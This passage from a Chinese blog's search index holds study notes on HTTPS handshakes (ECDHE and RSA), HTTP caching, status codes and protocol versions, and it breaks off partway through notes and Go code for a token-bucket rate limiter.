      <link href="/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-https-ECDHE%E6%8F%A1%E6%89%8B%E8%A7%A3%E6%9E%90/"/>
      <url>/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-https-ECDHE%E6%8F%A1%E6%89%8B%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTPS-ECDHE-握手解析"><a href="#HTTPS-ECDHE-握手解析" class="headerlink" title="HTTPS ECDHE 握手解析"></a>HTTPS ECDHE 握手解析</h2><p>RSA是比较传统的密钥交换算法，它不具备前向安全的性质，因此现在很少服务器使用。ECDHE具有前向安全，所以被广泛使用。</p><h3 id="ECDHE算法"><a href="#ECDHE算法" class="headerlink" title="ECDHE算法"></a>ECDHE算法</h3><ol><li>双方事先确定好使用哪种椭圆曲线，和曲线上的基点G，这两个参数是公开的</li><li>双方各自随机生成一个随机数作为私钥d，并与基点G相乘得到公钥Q（Q&#x3D;dG），此时客户端的公私钥为Q1和d1，服务端公私钥为Q2和d2</li><li>双方交换各自的公钥，最后客户端计算点（x1，y1）&#x3D;d1Q2，服务端计算点（x2，y2）&#x3D;d2Q1，由于椭圆曲线上是可以满足乘法交换和结合律的，所以d1Q2&#x3D;d1d2G&#x3D;d2d1G&#x3D;d2Q1，因此双方的x坐标是一样的，所以它是共享密钥，也就是会话秘钥</li></ol><p>这个过程功中，双方的私钥都是随机和临时生成的，都是不公开的，即使根据公开的信息（椭圆曲线、公钥、基点G）也是很难计算出椭圆曲线上的离散对数（私钥）。</p><h3 id="ECDHE握手过程"><a href="#ECDHE握手过程" class="headerlink" title="ECDHE握手过程"></a>ECDHE握手过程</h3><h4 id="第一次握手"><a href="#第一次握手" class="headerlink" title="第一次握手"></a>第一次握手</h4><ul><li>客户端发送一个Client Hello，消息里面有客户端使用的TLS版本号、支持的密码套件列表、以及生成的数据数 Client Random</li></ul><h4 id="第二次握手"><a href="#第二次握手" class="headerlink" title="第二次握手"></a>第二次握手</h4><ul><li>服务端收到客户端的招呼，返回Server Hello消息，里面有服务器确认的TLS版本号、随机数 Server Random、客户端列表里选择一个合适的密码套件。</li><li>接着服务端为证明自己身份，发送Certificate消息，把证书发给客户端</li><li>因为服务端选择了ECDHE密钥协商算法，所以在发送完证书后，发送Server Key Exchange消息。这个过程做了3件事<ul><li>选择椭圆曲线，选好椭圆曲线相当于椭圆曲线基点G也定好了，这些都会公开给客户端</li><li>生成随机数作为服务端椭圆曲线的私钥，保留到本地</li><li>根据基点G和私钥计算出服务端的椭圆曲线公钥，这个会公开给客户端。为保证椭圆曲线公钥不被第三方篡改，服务端会用RAS签名算法给公钥做签名</li></ul></li><li>随后就是Server Hello Done消息，表明服务端的招呼消息完毕</li></ul><p>至此，两次握手完成，目前客户端和服务端通过明文共享了这几个信息：Client Random、Server Random、使用的椭圆曲线、椭圆曲线的基点G、服务端椭圆曲线的公钥。</p><h4 id="第三次握手"><a href="#第三次握手" class="headerlink" title="第三次握手"></a>第三次握手</h4><ul><li>客户端收到服务端证书后，要校验证书是否合法。校验证书的过程会走证书链逐级验证，确认证书的真实性，再用证书的公钥验证签名，这样就能确认服务端身份。</li><li>客户端生成一个随机数作为客户端椭圆曲线的私钥，然后再根据服务端前面给的信息，生成客户端的公钥，然后用Cliennt Key Exchange消息发送给服务端</li></ul><p>至此，双方都有对方的椭圆曲线公钥、自己的椭圆曲线私钥、椭圆曲线基点G。于是双方都计算出点（x，y），其中x坐标值双方都是一样的，前面说ECDHE算法的时候，，说x是会话秘钥，但实际中，x还不是最终的会话秘钥。最终的会话秘钥，是用客户端随机数+服务端随机数+x，三个材料生成的。</p><p>之所以这么麻烦，是因为TLS设计者不信任客户端或服务器伪随机数的可靠性，为了保证真正的完全随机，把三个不可靠的随机数混合起来，那么随机的程度就非常高了。</p><ul><li>算好秘钥后，客户端会发出一个Change Cipher Spec消息，告诉服务端后续改用对称加密算法通信</li></ul><h4 id="第四次握手"><a href="#第四次握手" class="headerlink" title="第四次握手"></a>第四次握手</h4><ul><li>服务端发送Change Cipher Spec和Encrypted Handshake Message消息，如果双方都验证加解密没问题，那么握手正式完成。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>RSA和ECDHE握手过程的区别：</p><ul><li>RSA不支持前向保密</li><li>RSA密钥协商算法，TLS完成四次握手后才能进行应用数据传输。而ECDHE算法，客户端可以不用等待服务端的最后一次TLS我收，就可以提前发出加密的HTTP数据，节省一个消息的往返时间</li><li>使用ECDHE，在TLS第二次握手中，会出现服务端发出的Server Key Exchange消息，而RSA握手过程没有。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础-https-RSA握手解析</title>
      <link href="/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-https-RSA%E6%8F%A1%E6%89%8B%E8%A7%A3%E6%9E%90/"/>
      <url>/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-https-RSA%E6%8F%A1%E6%89%8B%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTPS-RSA握手解析"><a href="#HTTPS-RSA握手解析" class="headerlink" title="HTTPS RSA握手解析"></a>HTTPS RSA握手解析</h2><h3 id="TLS握手过程"><a href="#TLS握手过程" class="headerlink" title="TLS握手过程"></a>TLS握手过程</h3><p>解决明文传输的三个风险：</p><ul><li>窃听<ul><li>信息加密：http交互信息加密，第三方无法获取</li></ul></li><li>篡改<ul><li>校验机制：校验信息是否被篡改过，如果有，则警告提示</li></ul></li><li>冒充<ul><li>身份证书：证明支付宝是真支付宝</li></ul></li></ul><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>ClientHello: TLS Version, Client Random, Cipher Suites</td><td>-&gt;</td><td></td></tr><tr><td></td><td>&lt;-</td><td>ServerHello: TLS Version, Server Random, Cipher Suites</td></tr><tr><td></td><td></td><td>Certificate</td></tr><tr><td></td><td></td><td>ServerHelloDone</td></tr><tr><td>ClientKeyExchange: Pubkey</td><td>-&gt;</td><td></td></tr><tr><td>ChangeChipherSpec</td><td></td><td></td></tr><tr><td>Finished</td><td></td><td></td></tr><tr><td></td><td>&lt;-</td><td>ChangeCipherSpec</td></tr><tr><td></td><td></td><td>Finished</td></tr><tr><td>Application Data</td><td>&lt;-&gt;</td><td>Application Data</td></tr></tbody></table><p>每行数一个记录，记录是TLS首发数据的基本单位，类似TCP里的segment。多个记录可以组合成一个TCP包发送，所以经过四个消息就可以实现TLS我收，也就是需要2个RTT的时延，然后就可以在安全的通信环境里发送HTTP报文，实现HTTPS协议。</p><h3 id="RSA握手过程"><a href="#RSA握手过程" class="headerlink" title="RSA握手过程"></a>RSA握手过程</h3><p>在RSA密钥协商算法中，客户端会生成随机密钥，并使用服务端的公钥加密后再传给服务端。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/https/https_rsa.png" alt="img"></p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/https/%E8%AF%81%E4%B9%A6%E7%9A%84%E6%A0%A1%E9%AA%8C.png" alt="img"></p><h3 id="RSA算法缺陷"><a href="#RSA算法缺陷" class="headerlink" title="RSA算法缺陷"></a>RSA算法缺陷</h3><p>使用RSA密钥协商算法的最大问题是不支持前向保密。</p><p>因为客户端传递随机数给服务端使用的是公钥加密的，服务端收到后会用私钥解密得到随机数。一旦服务器私钥泄露，过去被第三方截获的所有TLS通讯密文都会被破解。为解决这个问题，后面出现了ECDHE算法，现在大多数网站使用的都是ECDHE密钥协商算法。</p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础-http1.1如何优化</title>
      <link href="/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-http1-1%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96/"/>
      <url>/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-http1-1%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP1-1如何优化"><a href="#HTTP1-1如何优化" class="headerlink" title="HTTP1.1如何优化"></a>HTTP1.1如何优化</h2><h3 id="如何避免发送HTTP请求"><a href="#如何避免发送HTTP请求" class="headerlink" title="如何避免发送HTTP请求"></a>如何避免发送HTTP请求</h3><ul><li>客户端会把第一次请求以及响应的数据保存在本地磁盘上，其中请求的URL作为key，响应作为value，形成映射。</li><li>后续发起相同请求时，先冲本地磁盘查到对应的value，从本地读取</li><li>服务器在发送HTTP响应时，会估算一个过期时间，并把这个信息放到响应头部中，这样客户端发现缓存过期是，就会重新发送网络请求</li><li>如果过期了，客户端在重新发送请求时，在请求的Etag头部带上第一次请求响应的摘要，这个摘要唯一标识响应的资源，当服务器收到请求后，将本地摘要和请求摘要对比，如果相同，说明缓存可以继续使用，那么服务器返回不含body的 304 Not Modified 响应，告诉客户端资源仍然有效。</li></ul><h3 id="如何减少HTTP请求次数"><a href="#如何减少HTTP请求次数" class="headerlink" title="如何减少HTTP请求次数"></a>如何减少HTTP请求次数</h3><h4 id="减少重定向请求次数"><a href="#减少重定向请求次数" class="headerlink" title="减少重定向请求次数"></a>减少重定向请求次数</h4><ul><li>服务器上资源迁移后，服务器会返回302响应码和Location头部，告诉客户端该资源已经迁移至url2，于是客户端重新请求url2。</li><li>服务端往往不止一层服务器，比如源服务器上一级是代理服务器，这时候需要两次全流程的请求和响应。代理服务器可以直接识别源服务器返回的状态码，自己发起重定向请求，省去客户端无感省去一次请求。</li><li>301 Moved Permanently，资源永久重定向到另一个URL，告诉客户端将重定向响应缓存到本地，之后客户端自动用url2代替url1访问服务器资源</li></ul><h4 id="合并请求"><a href="#合并请求" class="headerlink" title="合并请求"></a>合并请求</h4><ul><li>HTTP1.1默认不使用管道模式，为了防止单个请求阻塞，一般浏览器会同时发起5-6个请求，每个请求都是不同的TCP连接</li><li>将图片、图标合并成一个大图片；将js、css等资源打包成大文件；图片base64编码；都能减少HTTP请求次数</li></ul><h4 id="延迟发送请求"><a href="#延迟发送请求" class="headerlink" title="延迟发送请求"></a>延迟发送请求</h4><ul><li>HTTP里有很多当前不需要的资源，可以通过按需获取的方式，减少http请求次数</li><li>请求网页的时候，只获取用户看到的页面资源，当用户下滑页面的时候，再向服务器获取，懒加载</li></ul><h3 id="如何减少HTTP响应的数据大小"><a href="#如何减少HTTP响应的数据大小" class="headerlink" title="如何减少HTTP响应的数据大小"></a>如何减少HTTP响应的数据大小</h3><h4 id="无损压缩"><a href="#无损压缩" class="headerlink" title="无损压缩"></a>无损压缩</h4><ul><li>针对代码进行压缩，去除机器执行时用不到的换行、空格等多余符号</li><li>客户端支持的压缩算法，会在HTTP请求中通过头部Accept-Encoding告诉服务器<ul><li>Accept-Encoding：gzip, deflate, br</li></ul></li><li>服务器收到后，会选择一个服务器支持货合适的压缩算法，通过头响应Content-Encoding告诉客户端该资源使用的压缩算法<ul><li>Content-Encoding：gzip</li></ul></li></ul><h4 id="有损压缩"><a href="#有损压缩" class="headerlink" title="有损压缩"></a>有损压缩</h4><p>有损压缩主要讲次要的数据舍弃，牺牲质量来减少数据量，提高压缩比，常用于多媒体如音频、视频、图片等</p><ul><li>可以通过HTTP请求头中Accept字段里<em>q质量因子</em>，告诉服务器期望的资源量<ul><li>Accept：audio&#x2F;*; q&#x3D;0.2; autio&#x2F;basic</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础-http基础</title>
      <link href="/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-http%E5%9F%BA%E7%A1%80/"/>
      <url>/%E5%9F%BA%E7%A1%80/%E5%9F%BA%E7%A1%80-http%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>HTTP: 超文本传输协议，HyperText Transfer Protocol。一个在计算机世界专门在<strong>两点</strong>之间<strong>传输</strong>文字、图片、音频、视频等<strong>超文本</strong>数据的<strong>约定和规范</strong>。</p><p>协议：是在计算机世界里，使用计算机能够理解的语言确立的一种计算机之间交流通信的规范（两个以上参与者），以及相关各种控制和错误处理方式（行为约定和规范）。</p><p>传输：在两点之间双向传输数据，但允许有中转或接力。</p><p>超文本：本身是纯文字文件，但内部用很多标签定义了图片、视频等连接，经过浏览器解析，呈现出有文字和画面的网页。</p><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><ul><li>1xx：提示信息，表示目前是协议处理的中间状态，还需要后续的操作</li><li>2xx：成功，报文已经收到并被正确处理<ul><li>200 ok，如果是非HEAD请求，服务器返回的响应都会有body数据</li><li>204 no content 与200基本相同，但响应头没有body数据</li><li>206 partial content 应用于http分块下载或断电续传，表示响应返回的body数据不是资源的全部，而是其中的一部分，也是服务器处理成功的状态</li></ul></li><li>3xx：重定向，资源位置发生变动，需要客户端重新发送请求<ul><li>301 moved permanently 永久重定向，说明请求资源已经不存在，需要改用新的URL再次访问</li><li>302 found 临时重定向，说明请求的资源还在，但是暂时需要用另一个URL来访问。301,301都会在响应头里使用Location字段，指明后续要跳转的URL，浏览器会自动重定向新的URL</li><li>304 not modified 表示资源未修改，重定向已存在的缓冲文件，也称缓存重定向，告诉客户端可以继续使用缓存资源，用户缓存控制</li></ul></li><li><h2 id="4xx：客户端错误，请求报文错误，服务器无法处理-400-bad-request-客户端请求报文有错-401-unauthorized-要求身份验证-403-forbidden-服务器禁止访问资源-404-not-found-资源不存在-405-method-not-allowed-请求方法被禁止"><a href="#4xx：客户端错误，请求报文错误，服务器无法处理-400-bad-request-客户端请求报文有错-401-unauthorized-要求身份验证-403-forbidden-服务器禁止访问资源-404-not-found-资源不存在-405-method-not-allowed-请求方法被禁止" class="headerlink" title="4xx：客户端错误，请求报文错误，服务器无法处理- 400 bad request 客户端请求报文有错- 401 unauthorized 要求身份验证- 403 forbidden 服务器禁止访问资源- 404 not found 资源不存在- 405 method not allowed 请求方法被禁止"></a>4xx：客户端错误，请求报文错误，服务器无法处理<br>- 400 bad request 客户端请求报文有错<br>- 401 unauthorized 要求身份验证<br>- 403 forbidden 服务器禁止访问资源<br>- 404 not found 资源不存在<br>- 405 method not allowed 请求方法被禁止</h2></li><li>5xx：服务器错误，服务器请求时内部发生了错误<ul><li>500 internal server error 服务器错误</li><li>501 not implemented 功能不支持，敬请期待</li><li>502 bad gateway 服务器作为网关或代理是返回的错误码，表示服务器自身工作正常，访问后端服务发生了错误，或收到了一个无效响应</li><li>503 server unavailable 服务繁忙</li></ul></li></ul><h3 id="常见字段"><a href="#常见字段" class="headerlink" title="常见字段"></a>常见字段</h3><ul><li>Host：客户端发送请求时，用来指定服务器的域名，有了host字段，就可以将请求发往同一台机器的不同网站</li><li>Content-Length：服务器返回数据时，会有content-length字段，表名本质回应的数据长度。http协议通过设置回车符、换行符作为header的边界，通过content-length作为body的边界，为了解决粘包问题。</li><li>Connection：常用户客户端要求服务器使用http长连接机制，以便其他请求复用。http1.1默认连接都是长连接，但为了兼容老版本，需要指定Connection为Keep-Alive<ul><li>Connection：Keep-Alive</li></ul></li><li>Content-Type：用户服务器返回时，告诉客户端，本次数据时什么格式<ul><li>Accept：*&#x2F;* 客户端请求时声明自己可以接受哪些数据格式</li><li>Content-Type：text&#x2F;html；Charset&#x3D;utf-8 发送的是网页，而且编码是utf-8</li></ul></li><li>Content-Encoding：说明数据的压缩方法，表示服务区返回数据使用了什么压缩格式<ul><li>Accept-Encoding：gzip，default 客户端说明自己接受的压缩方法</li><li>Content-Encoding：gzip 告知客户端用此方法解压</li></ul></li></ul><h3 id="GET和POST"><a href="#GET和POST" class="headerlink" title="GET和POST"></a>GET和POST</h3><p>Get：RFC规范，从服务器获取指定的资源，请求的参数一般写在URL中，只允许ASCII字符，而且浏览器会对URL长度有限制（http本身对url长度没有任何规定）</p><p>Post：RFC规范，根据请求的负荷（Body）对执勤的资源做出处理，请求携带的数据一般写在body中，body数据可以试任意格式的，浏览器不会对body大小做限制</p><h3 id="HTTP缓存技术"><a href="#HTTP缓存技术" class="headerlink" title="HTTP缓存技术"></a>HTTP缓存技术</h3><p>对于具有重复性的HTTP请求，可以把这对请求-响应的数据都缓存在本地，http有两种缓存方式：</p><ul><li>强制缓存：只要浏览器判断缓存没有过期，则直接用浏览器本地缓存，决定是否使用缓存的主动性在浏览器这边<ul><li>强缓存利用Cache-Control（相对时间）；Expires（绝对时间）表示客户端缓存的有效期</li><li>具体实现：服务区在返回资源的同时，在response头部增加Cache-Control并设置过期时间，浏览器再次请求时先看过期时间载决定是够请求服务器</li></ul></li><li>协商缓存：304响应码，表示告诉服务器使用本地缓存。<ul><li>第一种：请求头部中的If-Modified-Since（第二次带上第一次的Last-Modified）字段与响应头部中的Last-Modified（资源最后修改时间）字段实现，服务器判定资源是否被改过。</li><li>第二种：请求头部中的If-None-Match（上次的Etag）字段与Etag（唯一标识响应资源）字段。可以避免由于时间篡改导致的不可靠问题、没有修改文件内容修改时间也可能改变问题、文件在秒级时间内被修改问题、有些服务器不能精确获取文件最后修改时间问题。</li></ul></li></ul><p>只有在未能命中强制缓存的时候，才能发起企鹅上缓存字段的请求</p><h3 id="HTTP特性"><a href="#HTTP特性" class="headerlink" title="HTTP特性"></a>HTTP特性</h3><p>HTTP1.1优点</p><ul><li>简单，报文格式就是header+body，头部信息也是key-value形式</li><li>灵活易于扩展：HTTP协议里请求方法、URI、状态码、头字段等都没有定死，可以自定义和扩展<ul><li>https就是在http和tcp之间增加了ssl&#x2F;tls安全传输层</li></ul></li><li>应用广泛和跨平台</li></ul><p>HTTP1.1缺点</p><ul><li>无状态：好处是服务器不需要记录额外信息，减轻负担。坏处是，服务器没有记忆，有关联性操作时会非常麻烦<ul><li>登录&gt;加购物车&gt;下单&gt;支付，都需要身份验证，但服务器不知道，每次都要查一遍身份信息</li><li>对于无状态问题，可以使用Cookie解决</li></ul></li><li>明文传输：方便阅读，但是内容容易被窃取</li><li>不安全：明文，内容可能被窃听；不验证身份，可能遭遇伪装；无法证明报文完整，可能被篡改<ul><li>用https解决</li></ul></li></ul><p>HTTP1.1性能</p><ul><li>长连接：http1.0每发起一起请求就建立一次TCP连接，而且是串行请求，增加了通信开销。1.1使用长连接通信，减少重复TCP建连和断开，减轻服务器负载。长时间灭有数据交互或任意一方主动提出，才会断开。</li><li>管道网络传输：在同一个TCP连接里，客户端可以发起多个请求，只要一个请求出去了，不必等其回来，就可以发起第二个请求，减少整体响应时间。但是服务器必须按照接收请求的顺序发送对应的响应，某个请求耗时长的情况下，后续请求的处理都会被阻塞，成为<strong>对头堵塞</strong>。所以1.1解决了请求的对头阻塞，没有解决响应的对头阻塞。实际，1.1的管道技术不是默认开启的，且浏览器基本都不支持。</li></ul><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><ul><li>https在tcp和http之间加入了ssl&#x2F;tls安全协议，使得报文能够加密传输</li><li>https在tcp3次握手后，还需要就行ssl&#x2F;tls的握手过程，才可以进入加密报文传输</li><li>https需要向CA申请数字证书</li><li>端口443</li></ul><h3 id="HTTPS解决了HTTP的哪些问题"><a href="#HTTPS解决了HTTP的哪些问题" class="headerlink" title="HTTPS解决了HTTP的哪些问题"></a>HTTPS解决了HTTP的哪些问题</h3><ul><li>窃听：信息加密，对称+非对称 混合加密</li><li>篡改：校验机制，摘要算法</li><li>冒充：身份验证，将服务器公钥放到数字证书中</li></ul><h3 id="HTTPS如何建立连接"><a href="#HTTPS如何建立连接" class="headerlink" title="HTTPS如何建立连接"></a>HTTPS如何建立连接</h3><ol><li>客户端向服务器索要并验证服务器公钥</li><li>双方协商生成会话密秘钥</li><li>采用会话秘钥进行加密通信</li></ol><p>tls的握手阶段涉及四次通信，使用不同秘钥交换算法，握手流程也不一样。</p><ul><li>RSA<ul><li>Client Hello，客户端向服务端发起加密通信请求。主要发送 TLS协议版本；客户端生产的随机数Client Random；客户端支持的密码套件列表，如RSA。</li><li>Server Hello，服务端收到客户端请求后，发出响应。主要有确认TLS协议版本，如果不支持则关闭加密通信；服务器生产的随机数Server Random；确认密码套件列表；服务器的数字证书。</li><li>客户端回应，客户端收到服务器回应后，首先通过CA公钥，确认服务器数字证书的真实性。如果证书没问题，客户端从数字证书去除服务器公钥，然后用它加密报文，向服务器发送如下信息<ul><li>一个随机数pre-master key</li><li>加密通信算法改变通知，表示随后都将用会话秘钥加密通信</li><li>客户端握手结束通知，表示客户端握手阶段已经结束。同时把之前所有内容发生的数据做摘要，供服务端校验。</li><li>服务端和客户端有了以上3个随机数，接着就用双方协商的加密算法，各自生成本质通信的会话秘钥</li></ul></li><li>服务器的最后回应，服务器收到随机数pre-master key后，通过协商算法计算本次通信的会话秘钥，之后向客户端发送最后信息：<ul><li>加密通信算法改变通知</li><li>服务器握手结束通知，表示服务器握手阶段结束。同时把之前所有内筒做摘要，供客户端校验。</li></ul></li><li>至此，TLS握手阶段结束，接下来客户端和服务端进入加密通信阶段，完全适用HTTP协议，但是用了会话秘钥加密内容。</li></ul></li></ul><h3 id="HTTP1-1、2、3演变"><a href="#HTTP1-1、2、3演变" class="headerlink" title="HTTP1.1、2、3演变"></a>HTTP1.1、2、3演变</h3><ul><li>1.1相比1.0提高了什么性能<ul><li>使用长连接改善了1.0短连接造成的性能开销</li><li>支持管道网络传输，第一个请求发出去后不必等待返回，就可以发出第二个请求，可以减少整体响应时间</li></ul></li><li>1.1存在的性能瓶颈<ul><li>请求、响应头部 Header 未经压缩就发送，首部信息越多延迟越大，只能压缩body部分</li><li>冗长的首部，每次互相发送相同首部造成资源浪费</li><li>服务器按顺序响应，服务器响应慢，会导致客户端一直请求不到数据，也就是队头阻塞</li><li>没有请求优先级控制</li><li>请求只能从客户端开始，服务端被动响应</li></ul></li><li>http2做了什么优化<ul><li>http2是基于https的，安全性有保障</li><li>头部压缩：如果同时发出多个请求，他们的头是一样或相似的，那么协议会消除重复的部分，。这就是所谓的HPACK算法，客户端和服务端同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不用发送同样的字段了，只发送索引号，提高速度。</li><li>二进制格式：不再像1.1里纯文本形式的报文，全面采用二进制格式，头信息和数据体都是二进制，并且统称为帧，头信息帧 Headers Frame和数据帧 Data Frame。对人不友好但是对计算机友好，增加了传输效率。</li><li>并发传输：引入Stream概念，多个Steam复用一条TCP连接。针对不同的HTTP请求用独一无二的StreamID来区分，接收端可以通过StreamID有序组成HTTP消息，不同Stream的帧可以乱序发送，也就是HTTP2可以并行交错的发送请求和响应。</li><li>服务器主动发送数据：客户端和服务端都可以建立Stream，客户端建立的Stream必须是奇数，服务器建立的Stream必须是偶数</li></ul></li><li>HTTP2有什么缺陷<ul><li>通过Stream的并发解决了1.1的对头阻塞问题，但是在TCP层还是有“对头阻塞”的问题。TCP必须保证收到的字节数据是完整且连续的，这样内核才会将缓冲区的数据返回给HTTP引用，那么当前一个字节数据没有到达时，后收到的字节数据只能存放在内核的缓冲区里，只有等到这一个字节数据到达时，HTTP2应用层才能从内核中拿到数据，这就是HTTP2的对头阻塞问题</li></ul></li><li>HTTP3做了哪些优化<ul><li>TCP换成UDP，UDP发送不管顺序，也不管丢包，所以不会出现像HTTP2的队头阻塞问题，UDP不可靠，但是基于UDP的QUIC协议可以实现类似TCP的可靠传输。QUIC有以下特点：</li><li>无队头阻塞：QUIC也有Stream与多路复用概念，当某个流丢包时，只会阻塞这个留，其他流不会受到影响，因此不存在对头阻塞问题。与HTTP2不同，HTTP2只要某个流中的数据包丢失，其他流也会受影响。</li><li>更快建立连接：对弈HTTP1和HTTP2，TCP和TLS是分层的，分别属于内核实现的传输层、openssl实现的表示层，因此它们难合并在一起，需要分批次握手，tcp先握，tls再握。HTTP3在传输数据前虽然需要QUIC协议握手，但是这个握手只需要1RTT，握手的目的是为了确认双方的连接ID，连接迁移就是基于连接ID实现的。HTTP3的QUIC协议并不是与TLS分层，而是QUIC包含了TLS，它在自己的帧携带TLS记录，再加上QUIC使用的是TLS1.3，因此只需要1RTT就可以完成建立连接与密钥协商。甚至在第二次连接的时候，应用数据包可以和QUIC握手信息(连接信息+TLS信息)一起发送，达到0RTT效果</li><li>连接迁移：TCP通过四元组确定一条连接，而QUIC是通过连接ID来标记通信的两个端点，客户端和服务端可以各自选择一组ID来标记自己，因此移动设备的网络变化后，导致IP地址变了，只要仍保有上下文信息，就可以无缝使用原连接，达到连接迁移的目的</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>令牌桶</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E4%BB%A4%E7%89%8C%E6%A1%B6/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E4%BB%A4%E7%89%8C%E6%A1%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li>以v的速度向桶内放置令牌，桶的容量为b，如果桶满了多余令牌就会被丢弃。</li><li>请求到达时，我们向桶内获取令牌，如果令牌足够，则请求通过。</li><li>如果桶内令牌不够，则这个请求会被缓存等待令牌足够是转发，或者被直接丢掉。</li><li>桶的容量b，可以应对突发的流量。</li></ol><h3 id="rate库"><a href="#rate库" class="headerlink" title="rate库"></a>rate库</h3><ol><li><p>基本结构体</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Limit <span class="token builtin">float64</span><span class="token keyword">type</span> Limiter <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> limit     Limit      <span class="token comment">// 每秒放入的令牌数量</span> burst     <span class="token builtin">int</span>        <span class="token comment">// 桶大小</span> mu        sync<span class="token punctuation">.</span>Mutex <span class="token comment">// 锁</span> tokens    <span class="token builtin">float64</span>    <span class="token comment">// 剩余令牌数量</span> last      time<span class="token punctuation">.</span>Time  <span class="token comment">// 上一次取走tokens的时间</span> lastEvent time<span class="token punctuation">.</span>Time  <span class="token comment">// 最近限流事件的时间</span><span class="token punctuation">&#125;</span><span class="token comment">// 令牌发放之后，会存储在 Reservation 预约对象中</span><span class="token keyword">type</span> Reservation <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> ok        <span class="token builtin">bool</span>      <span class="token comment">// 是否满足条件分配了token</span> lim       <span class="token operator">*</span>Limiter  <span class="token comment">// 发送令牌的限流器</span> tokens    <span class="token builtin">int</span>       <span class="token comment">// 发送 token 令牌的数量</span> timeToAct time<span class="token punctuation">.</span>Time <span class="token comment">// 满足令牌发放的时间</span> limit     Limit     <span class="token comment">// 令牌发放速度</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>方法</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 构建一个限流器，r 是每秒放入的令牌数量，b 是桶的大小</span><span class="token keyword">func</span> <span class="token function">NewLimiter</span><span class="token punctuation">(</span>r Limit<span class="token punctuation">,</span> b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>Limiter<span class="token comment">// 分别返回 b 和 r 的值</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Burst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Limit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Limit<span class="token comment">// token 3种消费方法</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Allow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token comment">// Allow(now, 1)</span><span class="token comment">// 表示截止到now这个时间点，是否存在n个token</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">AllowN</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">Reserve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span>Reservation <span class="token comment">// ReserveN(now, 1)</span><span class="token comment">// ReserveN和AllowN类似，表示截止到now这个时间点，是否存在n个token，无论Token是否充足，都会返回Reservation对象</span><span class="token keyword">func</span> <span class="token punctuation">(</span>lim <span class="token operator">*</span>Limiter<span class="token punctuation">)</span> <span class="token function">ReserveN</span><span class="token punctuation">(</span>now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> n <span class="token builtin">int</span><span class="token 